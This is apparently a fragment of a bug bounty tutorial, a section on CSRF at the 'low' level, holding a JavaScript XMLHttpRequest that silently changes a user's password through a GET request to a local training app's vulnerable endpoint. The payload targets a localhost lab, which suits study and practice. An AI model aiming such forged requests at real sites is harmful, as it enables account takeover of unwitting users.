# bug-bounty-tutorial
bug bounty tutorial

## 8.CSRF-Advanced

### low
```
const HttpRequest = new XMLHttpRequest();
const url ="http://127.0.0.1:42001/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#";
HttpRequest.open("GET", url);
HttpRequest.send();
```
